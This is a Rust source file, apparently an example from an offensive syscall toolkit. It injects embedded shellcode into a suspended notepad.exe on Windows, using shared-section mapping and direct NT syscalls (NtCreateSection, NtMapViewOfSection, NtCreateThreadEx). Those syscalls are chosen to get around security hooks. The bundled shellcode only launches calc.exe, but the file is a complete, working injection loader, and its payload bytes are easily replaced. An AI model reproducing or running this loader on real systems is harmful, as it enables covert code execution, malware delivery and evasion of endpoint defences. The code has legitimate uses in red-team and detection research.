/*
    Author: 0x42en
    License: BSD 3-Clause

    This example requires a Rust cross-compilation toolchain for Windows.

    Setup:
        rustup target add x86_64-pc-windows-gnu
        # Install MinGW linker
        apt install mingw-w64

    Required dependencies in Cargo.toml:
        [dependencies]
        md5 = "0.7"
        windows-sys = { version = "0.59", features = [
            "Win32_System_SystemServices",
            "Win32_System_SystemInformation",
            "Win32_System_Diagnostics_Debug",
            "Win32_System_Kernel",
            "Win32_System_Threading",
            "Win32_System_Memory",
            "Win32_Security",
            "Win32_Foundation",
        ]}

    Recommended release profile in Cargo.toml:
        [profile.release]
        strip = true
        lto = true
        codegen-units = 1
        panic = "abort"
        overflow-checks = false

    Compile on linux using:
        cargo build --release --target x86_64-pc-windows-gnu
*/

use std::ffi::CString;
use std::mem::zeroed;
use std::ptr;

use windows_sys::Win32::Foundation::CloseHandle;
use windows_sys::Win32::System::Memory::{
    PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, SEC_COMMIT,
};
use windows_sys::Win32::System::Threading::{
    CreateProcessA, ResumeThread, WaitForSingleObject, CREATE_SUSPENDED,
    PROCESS_ALL_ACCESS, PROCESS_INFORMATION, STARTUPINFOA, THREAD_ALL_ACCESS,
};

// Ensure syscall.rs is generated next to this file
mod syscall;
use syscall::*;

const SECTION_ALL_ACCESS: u32 = 0x000F001F;

// Shellcode generated with ShellSnip (launch calc.exe)
const SHELLCODE: &[u8] = &[
    0x48, 0x31, 0xff, 0x48, 0xf7, 0xe7, 0x65, 0x48, 0x8b, 0x58, 0x60, 0x48,
    0x8b, 0x5b, 0x18, 0x48, 0x8b, 0x5b, 0x20, 0x48, 0x8b, 0x1b, 0x48, 0x8b,
    0x1b, 0x48, 0x8b, 0x5b, 0x20, 0x49, 0x89, 0xd8, 0x8b, 0x5b, 0x3c, 0x4c,
    0x01, 0xc3, 0x48, 0x31, 0xc9, 0x66, 0x81, 0xc1, 0xff, 0x88, 0x48, 0xc1,
    0xe9, 0x08, 0x8b, 0x14, 0x0b, 0x4c, 0x01, 0xc2, 0x4d, 0x31, 0xd2, 0x44,
    0x8b, 0x52, 0x1c, 0x4d, 0x01, 0xc2, 0x4d, 0x31, 0xdb, 0x44, 0x8b, 0x5a,
    0x20, 0x4d, 0x01, 0xc3, 0x4d, 0x31, 0xe4, 0x44, 0x8b, 0x62, 0x24, 0x4d,
    0x01, 0xc4, 0xeb, 0x32, 0x5b, 0x59, 0x48, 0x31, 0xc0, 0x48, 0x89, 0xe2,
    0x51, 0x48, 0x8b, 0x0c, 0x24, 0x48, 0x31, 0xff, 0x41, 0x8b, 0x3c, 0x83,
    0x4c, 0x01, 0xc7, 0x48, 0x89, 0xd6, 0xf3, 0xa6, 0x74, 0x05, 0x48, 0xff,
    0xc0, 0xeb, 0xe6, 0x59, 0x66, 0x41, 0x8b, 0x04, 0x44, 0x41, 0x8b, 0x04,
    0x82, 0x4c, 0x01, 0xc0, 0x53, 0xc3, 0x48, 0x31, 0xc9, 0x80, 0xc1, 0x07,
    0x48, 0xb8, 0xff, 0xa8, 0x96, 0x91, 0xba, 0x87, 0x9a, 0x9c, 0x48, 0xc1,
    0xe8, 0x08, 0x48, 0xf7, 0xd0, 0x50, 0x51, 0xe8, 0xb0, 0xff, 0xff, 0xff,
    0x49, 0x89, 0xc6, 0x48, 0x31, 0xc0, 0x50, 0x48, 0xb8, 0x9c, 0x9e, 0x93,
    0x9c, 0xd1, 0x9a, 0x87, 0x9a, 0x48, 0xf7, 0xd0, 0x50, 0x48, 0x31, 0xd2,
    0x48, 0xff, 0xc2, 0x48, 0x89, 0xe1, 0x48, 0x83, 0xec, 0x20, 0x41, 0xff,
    0xd6, 0x48, 0x83, 0xc4, 0x20, 0xc3,
];

unsafe fn execute(name: &str) -> i32 {
    unsafe {
    // Uncomment the following line when using egg_hunter method:
    // spt_sanitize_syscalls();

    let mut oa: OBJECT_ATTRIBUTES = zeroed();
    let mut cid: CLIENT_ID = zeroed();
    let mut s_handle: HANDLE = ptr::null_mut();
    let mut p_handle: HANDLE = ptr::null_mut();
    let mut t_handle: HANDLE = ptr::null_mut();
    let mut local_base: PVOID = ptr::null_mut();
    let mut remote_base: PVOID = ptr::null_mut();
    let mut section_size: i64 = SHELLCODE.len() as i64;
    let mut view_size: SIZE_T = SHELLCODE.len();
    let shell_len: SIZE_T = SHELLCODE.len();

    // Create sacrificial process
    let c_name = CString::new(name).unwrap();
    let mut si: STARTUPINFOA = zeroed();
    si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
    let mut pi: PROCESS_INFORMATION = zeroed();

    CreateProcessA(
        c_name.as_ptr() as *const u8,
        ptr::null_mut(),
        ptr::null(),
        ptr::null(),
        0,
        CREATE_SUSPENDED,
        ptr::null(),
        ptr::null(),
        &si,
        &mut pi,
    );
    // Wait until creation
    WaitForSingleObject(pi.hProcess, 1000);

    // Generate Object
    InitializeObjectAttributes!(
        &mut oa as *mut OBJECT_ATTRIBUTES,
        ptr::null_mut(),
        0,
        ptr::null_mut(),
        ptr::null_mut()
    );
    cid.UniqueProcess = pi.dwProcessId as isize as HANDLE;
    cid.UniqueThread = ptr::null_mut();

    // Open sacrificial process
    NtOpenProcess(
        &mut p_handle,
        PROCESS_ALL_ACCESS,
        &mut oa as *mut OBJECT_ATTRIBUTES,
        &mut cid as *mut CLIENT_ID,
    );

    // Create a shared section large enough for shellcode
    NtCreateSection(
        &mut s_handle,
        SECTION_ALL_ACCESS,
        ptr::null_mut(),
        &mut section_size as *mut i64 as PLARGE_INTEGER,
        PAGE_EXECUTE_READWRITE as ULONG,
        SEC_COMMIT as ULONG,
        ptr::null_mut(),
    );

    // Map section as RW in current process (for writing)
    let current_process = -1isize as HANDLE;
    view_size = shell_len;
    NtMapViewOfSection(
        s_handle,
        current_process,
        &mut local_base as *mut PVOID as PVOID,
        0,
        shell_len,
        ptr::null_mut(),
        &mut view_size as *mut SIZE_T as PSIZE_T,
        SECTION_INHERIT::ViewShare,
        0,
        PAGE_READWRITE as ULONG,
    );

    // Copy shellcode locally (no cross-process write needed)
    ptr::copy_nonoverlapping(SHELLCODE.as_ptr(), local_base as *mut u8, shell_len);

    // Map same section as RX in target process (for execution)
    view_size = shell_len;
    NtMapViewOfSection(
        s_handle,
        p_handle,
        &mut remote_base as *mut PVOID as PVOID,
        0,
        shell_len,
        ptr::null_mut(),
        &mut view_size as *mut SIZE_T as PSIZE_T,
        SECTION_INHERIT::ViewShare,
        0,
        PAGE_EXECUTE_READ as ULONG,
    );

    // Unmap local RW view (no longer needed)
    NtUnmapViewOfSection(current_process, local_base);

    // Create main thread of sacrificial process
    NtCreateThreadEx(
        &mut t_handle,
        THREAD_ALL_ACCESS,
        ptr::null_mut(),
        p_handle,
        remote_base,      // StartRoutine
        ptr::null_mut(),  // Argument
        0,                // CreateFlags (FALSE)
        0,                // ZeroBits
        0,                // StackSize
        0,                // MaximumStackSize
        ptr::null_mut(),  // AttributeList
    );

    // Start main thread
    ResumeThread(t_handle);

    // Close handles
    CloseHandle(s_handle);
    CloseHandle(t_handle);
    CloseHandle(p_handle);

    0
    } // unsafe
}

fn main() {
    // You might want to change sacrificial process name
    let name = "C:\\Windows\\System32\\notepad.exe";
    unsafe {
        execute(name);
    }
}
